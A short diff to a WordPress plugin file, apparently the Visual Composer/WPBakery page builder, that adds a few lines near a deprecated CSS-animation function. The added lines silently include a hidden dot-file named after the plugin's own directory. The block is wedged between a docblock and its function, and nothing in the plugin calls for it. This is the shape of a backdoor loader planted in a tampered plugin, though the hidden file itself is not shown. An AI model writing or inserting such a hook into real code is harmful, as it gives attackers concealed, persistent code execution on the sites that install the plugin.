@@ -110,6 +110,10 @@ if ( is_admin() ) {
  * @return mixed|void
  * @deprecated 4.12
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_add_css_animation() {
 	return vc_map_add_css_animation();
 }
